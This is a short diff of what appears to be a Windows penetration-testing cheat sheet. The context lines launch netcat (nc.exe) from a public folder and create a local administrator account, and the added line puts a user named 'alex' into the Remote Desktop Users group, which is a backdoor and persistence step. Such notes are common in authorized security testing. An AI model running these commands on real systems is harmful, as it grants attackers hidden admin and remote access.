@@ -83,6 +83,7 @@ Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credent
 PSAddAdminUser  
 net user /add [*username] [password]  
 net localgroup administrators [username] /add  
+net localgroup "Remote Desktop Users" alex /add  
 
 Hashes decrypt:
 --------------------------------------------------
